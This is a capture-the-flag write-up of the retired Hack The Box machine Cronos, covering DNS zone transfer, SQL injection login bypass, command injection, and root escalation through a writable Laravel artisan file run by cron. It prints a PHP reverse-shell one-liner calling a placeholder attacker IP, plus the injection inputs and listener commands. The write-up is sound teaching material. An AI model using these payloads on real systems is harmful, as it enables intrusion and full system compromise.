---
title: "HTB: Cronos"
platform: "Hack The Box (retired)"
difficulty: "Medium"
os: "Linux"
excerpt: "DNS zone transfer reveals a hidden admin panel, SQL injection bypasses the login, command injection lands a shell, and a root cron job running Laravel finishes the job."
---

*Retired HTB machine — writeup shared per HTB's community guidelines.*

Cronos is a Linux box that strings together several classic techniques into one
coherent chain: DNS enumeration to find a hidden subdomain, a SQL injection login
bypass, command injection for the initial foothold, and a root-owned cron job
running a PHP framework's task scheduler for privilege escalation. The box name
is a fairly direct hint about where root ends up coming from.

## Recon

An initial Nmap scan showed three open ports: 22 (SSH), 53 (DNS), and 80 (HTTP).
Browsing to port 80 directly didn't show much of use — with DNS open, the more
interesting move was checking whether the name server would hand over its full
zone data.

![Nmap scan results](/assets/img/htb-cronos/01-nmap-scan.png)

## Hostname Discovery via Zone Transfer

Requesting a DNS zone transfer against the target's name server worked — a
classic misconfiguration where a DNS server hands its complete zone file to
anyone who asks, rather than restricting transfers to trusted secondary servers:

```
dig axfr cronos.htb @<target>
```

This returned several hostnames beyond the base domain, including
`admin.cronos.htb` and `www.cronos.htb`. Added them to `/etc/hosts`.

![DNS zone transfer results](/assets/img/htb-cronos/02-zone-transfer.png)

## Web Enumeration

`admin.cronos.htb` turned out to be the interesting one — it led straight to a
login page.

![Admin login page](/assets/img/htb-cronos/03-login-page.png)

## SQL Injection Login Bypass

Rather than guessing credentials, a basic SQL injection payload in the username
field (`admin'--`) bypassed the login entirely, landing on a page titled "Net
Tool v0.1."

![SQL injection bypassing the login](/assets/img/htb-cronos/04-sqli-bypass.png)

![Net Tool v0.1 page](/assets/img/htb-cronos/05-nettool-page.png)

## Command Injection

The Net Tool page offered network utility functions — traceroute and ping —
which are a common source of command injection when user input gets passed
straight to a shell command. Testing the traceroute field with an appended
`; ls -la` confirmed it: the extra command executed and its output came back in
the response.

![Command injection confirmed via traceroute field](/assets/img/htb-cronos/06-command-injection.png)

## Getting a Shell

With command injection confirmed, the next step was catching a proper reverse
shell. Started a listener:

```
nc -lvnp 4444
```

![Netcat listener ready](/assets/img/htb-cronos/07-listener-setup.png)

Submitted a PHP one-liner reverse shell through the vulnerable field:

```
8.8.8.8; php -r '$sock=fsockopen("<attacker-ip>",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

![Payload submitted through the vulnerable field](/assets/img/htb-cronos/08-payload-field.png)

The listener caught a connection back, landing a shell as `www-data`.

![Shell caught as www-data](/assets/img/htb-cronos/09-shell-caught.png)

## Post-Exploitation Enumeration

Basic directory checking around the web root turned up a configuration file
holding database credentials for the application's backend.

![Directory enumeration on the target](/assets/img/htb-cronos/10-directory-check.png)

![Database credentials found in a config file](/assets/img/htb-cronos/11-config-creds.png)

Upgraded to a proper interactive shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Finding the Privilege Escalation Path

Given the machine's name, cron jobs were an obvious thing to check early:

```
cat /etc/crontab
```

![Crontab contents](/assets/img/htb-cronos/12-crontab-output.png)

This turned up a job running every minute, as root:

```
* * * * *  root  php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

`artisan` is the command-line tool bundled with the Laravel PHP framework, and
`schedule:run` executes whatever's defined in Laravel's task scheduler
(`app/Console/Kernel.php`). Since this runs as root every sixty seconds, the
question became: can `www-data` influence what actually executes?

![Kernel.php and the Laravel scheduler](/assets/img/htb-cronos/13-kernel-php.png)

## Privilege Escalation

Checking file ownership and permissions on `artisan` confirmed it was owned by
`www-data` — meaning the low-privileged web user had full write access to a
file that root's cron job executes every minute, without ever validating its
contents.

![Confirming write access to the artisan file](/assets/img/htb-cronos/14-artisan-permissions.png)

With write access confirmed, replacing `artisan`'s contents with a PHP reverse
shell payload and waiting for the next cron cycle was enough — the cron job
executed the file as root, exactly as scheduled, and a new connection landed on
a fresh listener running as `root`.

## Root

The root shell connection confirmed full compromise, and the root flag was
sitting in `/root` as expected.

![Root shell and flag](/assets/img/htb-cronos/15-root-shell-flag.png)

## Attack Chain Summary

```
nmap (22, 53, 80) → DNS zone transfer reveals admin.cronos.htb
  → /etc/hosts → admin login page
  → SQL injection login bypass → Net Tool v0.1
  → command injection via traceroute field
  → PHP reverse shell payload → shell as www-data
  → config file → DB credentials
  → /etc/crontab → root cron running Laravel's artisan scheduler
  → artisan owned/writable by www-data
  → overwrite artisan with reverse shell → cron fires → ROOT
```

## Key Takeaways

1. DNS zone transfers are still worth trying whenever port 53 is open. A
   misconfigured name server handing over its full zone file is one of the
   fastest ways to discover hidden subdomains that never show up in web
   directory brute-forcing.
2. Login forms are always worth a basic SQL injection check before anything
   else — a payload as simple as `admin'--` bypassing authentication entirely
   is still common on custom-built admin panels.
3. Any feature that shells out to system utilities (traceroute, ping, nslookup)
   is a prime command injection candidate. Test with a simple appended command
   before assuming input is sanitized.
4. Cron jobs running as root against files owned by a lower-privileged user are
   a direct and reliable privilege escalation path — always check
   `/etc/crontab` and any user-specific crontabs during enumeration, and check
   file ownership on anything a privileged cron job touches.
5. Framework-specific task runners (like Laravel's `artisan`) are still just
   files on disk. If a lower-privileged account can write to the file a
   privileged scheduled task executes, the framework's own security model
   doesn't matter — file permissions are what actually decide who controls
   execution.

## Tools Used

`nmap`, `dig`, a browser (SQL injection and command injection testing), `netcat`,
`python3`.
